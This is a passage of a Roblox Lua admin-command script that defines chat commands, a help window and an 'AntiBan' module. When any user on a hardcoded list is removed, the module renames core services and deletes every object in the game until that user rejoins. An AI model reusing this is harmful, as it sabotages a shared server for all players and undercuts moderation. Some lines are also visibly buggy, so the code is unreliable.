local LeftHip = Instance.new("Motor6D")
LeftHip.Name = "Left Hip"
LeftHip.Part0 = Torso
LeftHip.Part1 = LeftLeg
LeftHip.C0 = CFrame.new(-0.5, -1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
LeftHip.C1 = CFrame.new(0, 1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
LeftHip.MaxVelocity = 0.1
LeftHip.Parent = Torso
local RightHip = Instance.new("Motor6D")
RightHip.Name = "Right Hip"
RightHip.Part0 = Torso
RightHip.Part1 = RightLeg
RightHip.C0 = CFrame.new(0.5, -1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
RightHip.C1 = CFrame.new(0, 1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
RightHip.MaxVelocity = 0.1
RightHip.Parent = Torso
local Humanoid = Instance.new("Humanoid")
Humanoid.Parent = Character
local BodyColors = Instance.new("BodyColors")
BodyColors.Name = "Body Colors"
coroutine.wrap(function()
wait(0.035)
BodyColors.HeadColor = Head.BrickColor
BodyColors.TorsoColor = Torso.BrickColor
BodyColors.LeftArmColor = LeftArm.BrickColor
BodyColors.RightArmColor = RightArm.BrickColor
BodyColors.LeftLegColor = LeftLeg.BrickColor
BodyColors.RightLegColor = RightLeg.BrickColor
BodyColors.Parent = Character
end)()
local Shirt = Instance.new("Shirt")
Shirt.Name = "Shirt"
Shirt.ShirtTemplate = ""
Shirt.Parent = Character
local ShirtGraphic = Instance.new("ShirtGraphic")
ShirtGraphic.Name = "Shirt Graphic"
ShirtGraphic.Graphic = ""
ShirtGraphic.Parent = Character
local Pants = Instance.new("Pants")
Pants.Name = "Pants"
Pants.PantsTemplate = ""
Pants.Parent = Character
if CharacterMeshes == true then
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Torso"
CharacterMesh.BodyPart = "Torso"
CharacterMesh.MeshId = "27111894"
CharacterMesh.Parent = Character
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Torso"
CharacterMesh.BodyPart = "Torso"
CharacterMesh.MeshId = "27111894"
CharacterMesh.Parent = Character
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Left Arm"
CharacterMesh.BodyPart = "LeftArm"
CharacterMesh.MeshId = "27111419"
CharacterMesh.Parent = Character
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Right Arm"
CharacterMesh.BodyPart = "RightArm"
CharacterMesh.MeshId = "27111864"
CharacterMesh.Parent = Character
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Left Leg"
CharacterMesh.BodyPart = "LeftLeg"
CharacterMesh.MeshId = "27111857"
CharacterMesh.Parent = Character
local CharacterMesh = Instance.new("CharacterMesh")
CharacterMesh.Name = "ROBLOX 2.0 Right Leg"
CharacterMesh.BodyPart = "RightLeg"
CharacterMesh.MeshId = "27111882"
CharacterMesh.Parent = Character
end
Character:MoveTo(Vector3.new(0, 10000, 0))
Character:MakeJoints()
return Character
end
return true
end, function(Self, Message)
Self.CreateCharacter = nil
return true
end, "Usage: Self.CreateCharacter. Creates and returns pre-formatted character.")

CoolCMDs.Functions.CreateModule("AntiBan", function(Self, Message)
pcall(function() while CoolCMDs.Functions.GetCommand("fp") do CoolCMDs.Functions.RemoveCommand("fp") end end)
CoolCMDs.Functions.CreateCommand("fp", 1, function(Message, MessageSplit, Speaker, Self)
local AB = CoolCMDs.Functions.GetModule("AntiBan")
if AB == nil then
CoolCMDS.Functions.CreateMessage("Hint", "This command requires the AntiBan module to be enabled.", 5, Speaker)
return
end
if AB.Enabled == false then
CoolCMDS.Functions.CreateMessage("Hint", "This command requires the AntiBan module to be installed (how the heck did you remove it without the command?!).", 5, Speaker)
return
end
if MessageSplit[1]:lower() == "a" then
AB.AntibanEnabled = true
CoolCMDs.Functions.CreateMessage("Message", "Full Protection: Self AntiBan Activated.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "d" then
AB.AntibanEnabled = false
CoolCMDs.Functions.CreateMessage("Message", "Full Protection: Self AntiBan Deactivated.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "add" then
for i = 2, #MessageSplit do
table.insert(AB.Players, MessageSplit[i])
end
CoolCMDs.Functions.CreateMessage("Message", "Full Protection: Player Added.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "r-e--m-o-ve-" then
for i = 2, #MessageSplit do
for x = 1, #AB.Players do
if string.match(AB.Players[x]:lower(), MessageSplit[i]:lower()) then
table.remove(AB.Players, x)
end
end
end
CoolCMDs.Functions.CreateMessage("Message", "[Group.AntiBan.RobloxDSWarriors] Removed.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "remove all" then
AB.Players = {}
CoolCMDs.Functions.CreateMessage("Message", "[Group.AntiBan.RobloxDSWarriors] Removed all entries.", 2.5, Speaker)
end
end, "AntiBan Controller", "Control the AntiBan module.", "on, off, [a, d]" ..CoolCMDs.Data.SplitCharacter.. "player" ..CoolCMDs.Data.SplitCharacter.. "[...], remove all")
if Self.AntibanEnabled == nil then
Self.AntibanEnabled = true
end
if Self.Players == nil then
Self.Players = {"TheDukeOfYork", "SuperBoss121", "Player", "KickerMaster09876", "runeclub0", "lewiswd", "der578", "HorribleJiajun159", "zacy5000", "BlueCamaro60", "Waldocooper", "misgav11", "noobv11", "noobv14", "julialy"}
end
if Self.Time == nil then
Self.Time = 60 * 60
end
if Self.EvasionPenalty == nil then
Self.EvasionPenalty = 5
end
if Self.CheckPlayer ~= nil then
pcall(function() Self.CheckPlayer:disconnect() end)
Self.CheckPlayer = nil
end
Self.CheckPlayer = game:service("Players").ChildRemoved:connect(function(Player)
if Self.Enabled == false or Self.AntibanEnabled == false then return end
if not Player:IsA("Player") then return end
for i = 1, #Self.Players do
if Player.Name == Self.Players[i] then
coroutine.wrap(function()
local StatusMessage = CoolCMDs.Functions.CreateMessage("Message")
local StatusMessagePrefix = "Full Protection: " ..Self.Players[i].. " "
StatusMessage.Changed:connect(function(Property)
if Property == "Text" then
if string.sub(StatusMessage.Text, 0, string.len(StatusMessagePrefix)) == StatusMessagePrefix then return false end
StatusMessage.Text = StatusMessagePrefix .. StatusMessage.Text
end
end)
local Time = Self.Time
while true do
if Self.AntibanEnabled == false then
StatusMessage:Remove()
return
end
local Found, IsPlayer = pcall(function() return game:service("Players")[Self.Players[i]]:IsA("Player") end)
if Found == true and IsPlayer == true then
break
elseif Found == true and IsPlayer == false then
StatusMessage.Text = "Non-player object found in the \"Players\" service. " ..TimePenalty.. " second penalty for evasion!"
Time = Time - 2.5 - Self.EvasionPenalty
pcall(function() game:service("Players")[Self.Players[i]]:Remove() end)
wait(2.5)
end
if Time > 0 then
Time = Time - 140
StatusMessage.Text = math.floor(Time / 10).. " "
end
if Time <= 0 then
game:service("Workspace").Name = math.random(100, 1000000)
game:service("Players").Name = math.random(100, 1000000)
for _, Part in pairs(CoolCMDs.Functions.GetRecursiveChildren()) do
pcall(function() Part.Disabled = true end)
pcall(function() Part:Remove() end)
end
if game:service("Lighting"):FindFirstChild("AntibanSky") == nil then
local Sky = Instance.new("Sky")
Sky.Name = "AntibanSky"
Sky.SkyboxDn = "http://www.Roblox.com/Asset/?id=48308661"
Sky.SkyboxUp = "http://www.Roblox.com/Asset/?id=48308661"
Sky.SkyboxLf = "http://www.Roblox.com/Asset/?id=48308661"
Sky.SkyboxRt = "http://www.Roblox.com/Asset/?id=48308661"
Sky.SkyboxFt = "http://www.Roblox.com/Asset/?id=48308661"
Sky.SkyboxBk = "http://www.Roblox.com/Asset/?id=48308661"
Sky.CelestialBodiesShown = false
Sky.StarCount = 0
Sky.Parent = game:service("Lighting")
end
StatusMessage.Text = "Full Protection Waiting on: " ..Self.Players[i].. " to come back."
end
StatusMessage.Parent = game:service("Workspace")
wait(0.05)
end
Self.AntibanEnabled = false
wait(0.11)
Self.AntibanEnabled = true
StatusMessage.Text = "Admin Returned! Loading Game, Please Wait."
wait(5)
StatusMessage:Remove()
pcall(function() game:service("Lighting").AntibanSky:Remove() end)
game:service("Workspace").Name = "Workspace"
game:service("Players").Name = "Players"
end)()
end
end
end)
return true
end, function(Self, Message)
Self.AntibanEnabled = nil
Self.Players = nil
Self.Time = nil
Self.EvasionPenalty = nil
pcall(function() Self.CheckPlayer:disconnect() end)
Self.CheckPlayer = nil
return true
end, "Provides countermeasures for players in certain groups against being removed.")


CoolCMDs.Functions.CreateCommand("join", 1, function(msg, MessageSplit, speaker, Self)
local theteam = nil
local tnum = 0
if game.Teams ~= nil then
local c = game.Teams:GetChildren()
for i =1,#c do
if c[i].className == "Team" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(msg),6)) == 1 then
theteam = c[i]
tnum = tnum + 1
end 
end 
end
if tnum == 1 then
speaker.TeamColor = theteam.TeamColor
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("kick", 1, function(msg, MessageSplit, speaker, Self)
local theguy = nil
local gnum = 0
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(msg),6)) == 1 then
theguy = c[i]
gnum = gnum + 1
end 
end 
end
if gnum == 1 then
speaker.kv.Value = theguy
checkkickvotes(theguy)
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("donate", 1, function(msg, MessageSplit, speaker, Self)
local elnumber = 0
local thenum = 7
while true do
thenum = thenum + 1
if string.sub(msg,thenum,thenum) == "/" then
elnumber = thenum
break
elseif string.sub(msg,thenum,thenum) == "" then
return
end 
end
if elnumber == 0 then return end
local theguy = nil
local gnum = 0
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if c[i] ~= speaker then
if string.find(string.lower(c[i].Name),string.sub(string.lower(msg),elnumber + 1)) == 1 then
theguy = c[i]
gnum = gnum + 1
end 
end 
end 
end
if gnum == 1 then
local ls1 = speaker:FindFirstChild("leaderstats")
if ls1 ~= nil then
local money1 = ls1:FindFirstChild(MoName)
if money1 ~= nil then
local ls2 = theguy:FindFirstChild("leaderstats")
if ls2 ~= nil then
local money2 = ls2:FindFirstChild(MoName)
if money2 ~= nil then
local int = Instance.new("IntValue")
int.Value = string.sub(msg,8,elnumber - 1)
if int.Value > 0 then
if money1.Value >= int.Value then
money1.Value = money1.Value - int.Value
money2.Value = money2.Value + int.Value
end 
end
int:remove()
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand({" c", "/", "help", "commands"}, 1, function(Message, MessageSplit, Speaker, Self)
if CoolCMDs.Functions.IsModuleEnabled("GuiSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "CoolCMDs Help requires the GuiSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("GuiSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "CoolCMDs Help requires the GuiSupport module to be installed.", 5, Speaker)
return
end
local Commands = {}
for i = 1, #CoolCMDs.CommandHandles do
if (function()
if type(CoolCMDs.CommandHandles[i].Command) == "string" then
if string.match(CoolCMDs.CommandHandles[i].Command:lower(), Message:lower()) then
return true
end
elseif type(CoolCMDs.CommandHandles[i].Command) == "table" then
for x = 1, #CoolCMDs.CommandHandles[i].Command do
if string.match(CoolCMDs.CommandHandles[i].Command[x]:lower(), Message:lower()) then
return true
end
end
end
if string.match(CoolCMDs.CommandHandles[i].FullName:lower(), Message:lower()) then
return true
end
return false
end)() == true then
table.insert(Commands, CoolCMDs.CommandHandles[i])
end
end
local Modules = {}
for i = 1, #CoolCMDs.Modules do
if string.match(CoolCMDs.Modules[i].Name:lower(), Message:lower()) then
table.insert(Modules, CoolCMDs.Modules[i])
end
end
local Groups = {}
for i = 1, #CoolCMDs.GroupHandles do
if string.match(CoolCMDs.GroupHandles[i].Name:lower(), Message:lower()) or string.match(CoolCMDs.GroupHandles[i].FullName:lower(), Message:lower()) then
table.insert(Groups, CoolCMDs.GroupHandles[i])
end
end
local Gui = Instance.new("ScreenGui")
Gui.Parent = Speaker.PlayerGui
local Window = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0.5, -150, 0.5, -200), UDim2.new(0, 300, 0, 350), Gui, "CoolCMDs Help", true, true, true, true, true, true, true, nil, UDim2.new(0, 300, 0, 350))
local TabFrame = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.TabFrame.New(3)
TabFrame.Tab1.Text = "Commands"
TabFrame.Tab2.Text = "Modules"
TabFrame.Tab3.Text = "Groups"
TabFrame.Parent = Window.Content
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.TabFrame.SelectTab(TabFrame, 1)
local CurrentTab = 1
local CommandsIndex = 0
local CommandsFrame = Instance.new("Frame")
CommandsFrame.Name = "CommandsFrame"
CommandsFrame.Position = UDim2.new(0, 5, 0, 27)
CommandsFrame.Size = UDim2.new(1, -10, 1, -73)
CommandsFrame.Parent = Window.Content
if #Commands <= 0 then
local Warning = Instance.new("TextLabel")
Warning.Name = "Warning"
Warning.Text = "No commands match your search."
Warning.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
Warning.BorderSizePixel = 1
Warning.TextColor3 = Color3.new(0, 0, 0)
Warning.Size = UDim2.new(1, -50, 0, 50)
Warning.Position = UDim2.new(0, 25, 0.5, -25)
Warning.Parent = CommandsFrame
else
CommandsIndex = 1
local TextLabel1 = Instance.new("TextLabel")
TextLabel1.Name = "FullName"
TextLabel1.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel1.BorderSizePixel = 0
TextLabel1.BackgroundTransparency = 1
TextLabel1.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel1.BackgroundTransparency ~= 1 then TextLabel1.BackgroundTransparency = 1 end end)
TextLabel1.TextColor3 = Color3.new(0, 0, 0)
TextLabel1.TextWrap = true
TextLabel1.TextXAlignment = "Left"
TextLabel1.TextYAlignment = "Top"
TextLabel1.Size = UDim2.new(1, -20, 0, 30)
TextLabel1.Position = UDim2.new(0, 10, 0, 5)
TextLabel1.Parent = CommandsFrame
local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "Command"
TextLabel2.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel2.BorderSizePixel = 0
TextLabel2.BackgroundTransparency = 1
TextLabel2.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel2.BackgroundTransparency ~= 1 then TextLabel2.BackgroundTransparency = 1 end end)
TextLabel2.TextColor3 = Color3.new(0, 0, 0)
TextLabel2.TextWrap = true
TextLabel2.TextXAlignment = "Left"
TextLabel2.TextYAlignment = "Top"
TextLabel2.Size = UDim2.new(1, -20, 0, 30)
TextLabel2.Position = UDim2.new(0, 10, 0, 35)
TextLabel2.Parent = CommandsFrame
local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Name = "HelpArgs"
TextLabel3.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel3.BorderSizePixel = 0
TextLabel3.BackgroundTransparency = 1
TextLabel3.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel3.BackgroundTransparency ~= 1 then TextLabel3.BackgroundTransparency = 1 end end)
TextLabel3.TextColor3 = Color3.new(0, 0, 0)
TextLabel3.TextWrap = true
TextLabel3.TextXAlignment = "Left"
TextLabel3.TextYAlignment = "Top"
TextLabel3.Size = UDim2.new(1, -20, 0, 30)
TextLabel3.Position = UDim2.new(0, 10, 0, 65)
TextLabel3.Parent = CommandsFrame
local TextLabel4 = Instance.new("TextLabel")
TextLabel4.Name = "Control"
TextLabel4.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel4.BorderSizePixel = 0
TextLabel4.BackgroundTransparency = 1
TextLabel4.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel4.BackgroundTransparency ~= 1 then TextLabel4.BackgroundTransparency = 1 end end)
TextLabel4.TextColor3 = Color3.new(0, 0, 0)
TextLabel4.TextWrap = true
TextLabel4.TextXAlignment = "Left"
TextLabel4.TextYAlignment = "Top"
TextLabel4.Size = UDim2.new(1, -20, 0, 30)
TextLabel4.Position = UDim2.new(0, 10, 0, 95)
TextLabel4.Parent = CommandsFrame
local TextLabel5 = Instance.new("TextLabel")
TextLabel5.Name = "Help"
TextLabel5.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel5.BorderSizePixel = 0
TextLabel5.BackgroundTransparency = 1
TextLabel5.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel5.BackgroundTransparency ~= 1 then TextLabel5.BackgroundTransparency = 1 end end)
TextLabel5.TextColor3 = Color3.new(0, 0, 0)
TextLabel5.TextWrap = true
TextLabel5.TextXAlignment = "Left"
TextLabel5.TextYAlignment = "Top"
TextLabel5.Size = UDim2.new(1, -20, 0, 60)
TextLabel5.Position = UDim2.new(0, 10, 0, 125)
TextLabel5.Parent = CommandsFrame
end
local ModulesIndex = 0
local ModulesFrame = Instance.new("Frame")
ModulesFrame.Name = "ModulesFrame"
ModulesFrame.Position = UDim2.new(0, 5, 0, 27)
ModulesFrame.Size = UDim2.new(1, -10, 1, -73)
ModulesFrame.Parent = nil
if #Modules <= 0 then
local Warning = Instance.new("TextLabel")
Warning.Name = "Warning"
Warning.Text = "No modules match your search."
Warning.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
Warning.BorderSizePixel = 1
Warning.TextColor3 = Color3.new(0, 0, 0)
Warning.Size = UDim2.new(1, -50, 0, 50)
Warning.Position = UDim2.new(0, 25, 0.5, -25)
Warning.Parent = ModulesFrame
else
ModulesIndex = 1
local TextLabel1 = Instance.new("TextLabel")
TextLabel1.Name = "FullName"
TextLabel1.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel1.BorderSizePixel = 0
TextLabel1.BackgroundTransparency = 1
TextLabel1.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel1.BackgroundTransparency ~= 1 then TextLabel1.BackgroundTransparency = 1 end end)
TextLabel1.TextColor3 = Color3.new(0, 0, 0)
TextLabel1.TextWrap = true
TextLabel1.TextXAlignment = "Left"
TextLabel1.TextYAlignment = "Top"
TextLabel1.Size = UDim2.new(1, -20, 0, 30)
TextLabel1.Position = UDim2.new(0, 10, 0, 5)
TextLabel1.Parent = ModulesFrame
local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "Enabled"
TextLabel2.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel2.BorderSizePixel = 0
TextLabel2.BackgroundTransparency = 1
TextLabel2.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel2.BackgroundTransparency ~= 1 then TextLabel2.BackgroundTransparency = 1 end end)
TextLabel2.TextColor3 = Color3.new(0, 0, 0)
TextLabel2.TextWrap = true
TextLabel2.TextXAlignment = "Left"
TextLabel2.TextYAlignment = "Top"
TextLabel2.Size = UDim2.new(1, -20, 0, 30)
TextLabel2.Position = UDim2.new(0, 10, 0, 65)
TextLabel2.Parent = ModulesFrame
local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Name = "Help"
TextLabel3.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel3.BorderSizePixel = 0
TextLabel3.BackgroundTransparency = 1
TextLabel3.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel3.BackgroundTransparency ~= 1 then TextLabel3.BackgroundTransparency = 1 end end)
TextLabel3.TextColor3 = Color3.new(0, 0, 0)
TextLabel3.TextWrap = true
TextLabel3.TextXAlignment = "Left"
TextLabel3.TextYAlignment = "Top"
TextLabel3.Size = UDim2.new(1, -20, 0, 90)
TextLabel3.Position = UDim2.new(0, 10, 0, 125)
TextLabel3.Parent = ModulesFrame
end
local GroupsIndex = 0
local GroupsFrame = Instance.new("Frame")
GroupsFrame.Name = "GroupsFrame"
GroupsFrame.Position = UDim2.new(0, 5, 0, 27)
GroupsFrame.Size = UDim2.new(1, -10, 1, -73)
GroupsFrame.Parent = nil
if #Groups <= 0 then
local Warning = Instance.new("TextLabel")
Warning.Name = "Warning"
Warning.Text = "No groups match your search."
Warning.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
Warning.BorderSizePixel = 1
Warning.TextColor3 = Color3.new(0, 0, 0)
Warning.Size = UDim2.new(1, -50, 0, 50)
Warning.Position = UDim2.new(0, 25, 0.5, -25)
Warning.Parent = GroupsFrame
else
GroupsIndex = 1
local TextLabel1 = Instance.new("TextLabel")
TextLabel1.Name = "FullName"
TextLabel1.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel1.BorderSizePixel = 0
TextLabel1.BackgroundTransparency = 1
TextLabel1.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel1.BackgroundTransparency ~= 1 then TextLabel1.BackgroundTransparency = 1 end end)
TextLabel1.TextColor3 = Color3.new(0, 0, 0)
TextLabel1.TextWrap = true
TextLabel1.TextXAlignment = "Left"
TextLabel1.TextYAlignment = "Top"
TextLabel1.Size = UDim2.new(1, -20, 0, 30)
TextLabel1.Position = UDim2.new(0, 10, 0, 5)
TextLabel1.Parent = GroupsFrame
local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "Control"
TextLabel2.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel2.BorderSizePixel = 0
TextLabel2.BackgroundTransparency = 1
TextLabel2.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel2.BackgroundTransparency ~= 1 then TextLabel2.BackgroundTransparency = 1 end end)
TextLabel2.TextColor3 = Color3.new(0, 0, 0)
TextLabel2.TextWrap = true
TextLabel2.TextXAlignment = "Left"
TextLabel2.TextYAlignment = "Top"
TextLabel2.Size = UDim2.new(1, -20, 0, 30)
TextLabel2.Position = UDim2.new(0, 10, 0, 65)
TextLabel2.Parent = GroupsFrame
local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Name = "Help"
TextLabel3.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel3.BorderSizePixel = 0
TextLabel3.BackgroundTransparency = 1
TextLabel3.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel3.BackgroundTransparency ~= 1 then TextLabel3.BackgroundTransparency = 1 end end)
TextLabel3.TextColor3 = Color3.new(0, 0, 0)
TextLabel3.TextWrap = true
TextLabel3.TextXAlignment = "Left"
TextLabel3.TextYAlignment = "Top"
TextLabel3.Size = UDim2.new(1, -20, 0, 90)
TextLabel3.Position = UDim2.new(0, 10, 0, 125)
TextLabel3.Parent = GroupsFrame
end
local Previous = Instance.new("TextButton")
Previous.Text = "<"
Previous.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Previous.BorderColor3 = Color3.new(0, 0, 0)
Previous.BorderSizePixel = 1
Previous.TextColor3 = Color3.new(0, 0, 0)
Previous.FontSize = "Size18"
Previous.Size = UDim2.new(0, 25, 0, 35)
Previous.Position = UDim2.new(0, 5, 1, -40)
Previous.Parent = Window.Content
local Center = Instance.new("TextLabel")
Center.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Center.BorderColor3 = Color3.new(0, 0, 0)
Center.BorderSizePixel = 1
Center.TextColor3 = Color3.new(0, 0, 0)
Center.FontSize = "Size18"
Center.Size = UDim2.new(1, -60, 0, 35)
Center.Position = UDim2.new(0, 30, 1, -40)
Center.Parent = Window.Content
local Next = Instance.new("TextButton")
Next.Text = ">"
Next.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Next.BorderColor3 = Color3.new(0, 0, 0)
Next.BorderSizePixel = 1
Next.TextColor3 = Color3.new(0, 0, 0)
Next.FontSize = "Size18"
Next.Size = UDim2.new(0, 25, 0, 35)
Next.Position = UDim2.new(1, -30, 1, -40)
Next.Parent = Window.Content
local function UpdatePage()
if CurrentTab == 1 then
if #Commands <= 0 then return end
Center.Text = CommandsIndex.. " of " ..#Commands
CommandsFrame.FullName.Text = "Name: " ..Commands[CommandsIndex].FullName
if type(Commands[CommandsIndex].Command) == "string" then
CommandsFrame.Command.Text = "Command(s): \"" ..Commands[CommandsIndex].Command.. CoolCMDs.Data.SplitCharacter.. "\""
elseif type(Commands[CommandsIndex].Command) == "table" then
CommandsFrame.Command.Text = "Command(s): " ..(function() local Command = "\"" ..Commands[CommandsIndex].Command[1] .. CoolCMDs.Data.SplitCharacter.. "\"" for x = 2, #Commands[CommandsIndex].Command do Command = Command.. " or \"" ..Commands[CommandsIndex].Command[x] .. CoolCMDs.Data.SplitCharacter.. "\"" end return Command end)()
end
CommandsFrame.HelpArgs.Text = "Arguments(s): " ..Commands[CommandsIndex].HelpArgs
CommandsFrame.Control.Text = "Required control: " ..Commands[CommandsIndex].Control
CommandsFrame.Help.Text = "Help / Description: " ..Commands[CommandsIndex].Help
Previous.BackgroundColor3 = CommandsIndex <= 1 and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
Next.BackgroundColor3 = (CommandsIndex >= #Commands or #Commands <= 1) and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
elseif CurrentTab == 2 then
if #Modules <= 0 then return end
Center.Text = ModulesIndex.. " of " ..#Modules
ModulesFrame.FullName.Text = "Name: " ..Modules[ModulesIndex].Name
ModulesFrame.Enabled.Text = "Enabled: " ..tostring(Modules[ModulesIndex].Enabled):sub(0, 1):upper() .. tostring(Modules[ModulesIndex].Enabled):sub(2)
ModulesFrame.Help.Text = "Help / Description: " ..Modules[ModulesIndex].Help
Previous.BackgroundColor3 = ModulesIndex <= 1 and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
Next.BackgroundColor3 = (ModulesIndex >= #Modules or #Modules <= 1) and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
elseif CurrentTab == 3 then
if #Groups <= 0 then return end
Center.Text = GroupsIndex.. " of " ..#Groups
GroupsFrame.FullName.Text = "Name: " ..Groups[GroupsIndex].FullName.. " (" ..Groups[GroupsIndex].Name.. ")"
GroupsFrame.Control.Text = "Control: " ..Groups[GroupsIndex].Control
GroupsFrame.Help.Text = "Help / Description: " ..Groups[GroupsIndex].Help
Previous.BackgroundColor3 = GroupsIndex <= 1 and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
Next.BackgroundColor3 = (GroupsIndex >= #Groups or #Groups <= 1) and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.4, 0.4, 0.4)
end
end
UpdatePage()
TabFrame.Tab1.MouseButton1Up:connect(function()
CurrentTab = 1
CommandsFrame.Parent = Window.Content
ModulesFrame.Parent = nil
GroupsFrame.Parent = nil
UpdatePage()
end)
TabFrame.Tab2.MouseButton1Up:connect(function()
CurrentTab = 2
CommandsFrame.Parent = nil
ModulesFrame.Parent = Window.Content
GroupsFrame.Parent = nil
UpdatePage()
end)
TabFrame.Tab3.MouseButton1Up:connect(function()
CurrentTab = 3
CommandsFrame.Parent = nil
ModulesFrame.Parent = nil
GroupsFrame.Parent = Window.Content
UpdatePage()
end)
Previous.MouseButton1Up:connect(function()
if CurrentTab == 1 then
if CommandsIndex - 1 <= 0 then return end
CommandsIndex = CommandsIndex - 1
elseif CurrentTab == 2 then
if ModulesIndex - 1 <= 0 then return end
ModulesIndex = ModulesIndex - 1
elseif CurrentTab == 3 then
if GroupsIndex - 1 <= 0 then return end
GroupsIndex = GroupsIndex - 1
end
UpdatePage()
end)
Next.MouseButton1Up:connect(function()
if CurrentTab == 1 then
if CommandsIndex + 1 > #Commands then return end
CommandsIndex = CommandsIndex + 1
elseif CurrentTab == 2 then
if ModulesIndex + 1 > #Modules then return end
ModulesIndex = ModulesIndex + 1
elseif CurrentTab == 3 then
if GroupsIndex + 1 > #Groups then return end
GroupsIndex = GroupsIndex + 1
end
UpdatePage()
end)
Window.Changed:connect(function(Property)
if Property == "Parent" then
if Window.Parent == nil then
Gui:Remove()
end
end
end)
end, "Help", "Gives help for commands, modules and groups.", "search terms (optional)")

CoolCMDs.Functions.CreateCommand("getstatus", 4, function(Message, MessageSplit, Speaker, Self)
CoolCMDs.Functions.CreateMessage("Hint", "Instance: " ..CoolCMDs.Initialization.InstanceNumber.. ". Elapsed initialization time: " ..CoolCMDs.Initialization.ElapsedTime.. ". Root: _G.CoolCMDs[" ..CoolCMDs.Initialization.InstanceNumber.. "].Instance()", 10, Speaker)
end, "Get Status", "Get current command status.", "None")

CoolCMDs.Functions.CreateCommand("status", 1, function(Message, MessageSplit, Speaker, Self)
CoolCMDs.Functions.CreateMessage("Message", "Group name: " ..CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group.. "  |  Group full name: " ..CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group).FullName.. "  |  Group control level: " ..CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group).Control, 5, Speaker)
end, "My Status", "Get your group name and control level.", "None")

CoolCMDs.Functions.CreateCommand({"reset", "die", "suicide"}, 1, function(Message, MessageSplit, Speaker, Self)
if Speaker.Character ~= nil then
if Speaker.Character:FindFirstChild("Humanoid") ~= nil then
Speaker.Character.Humanoid.Health = 0
else
Speaker.Character:BreakJoints()
end
end
end, "Suicide", "Kill yourself.", "None")

CoolCMDs.Functions.CreateCommand({"hint.", "h.", "whisper"}, 4, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
CoolCMDs.Functions.CreateMessage("Hint", Speaker.Name.. ": " ..MessageSplit[i], 5)
wait(5)
end
end, "Hint", "Creates a hint in the Workspace.", "line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

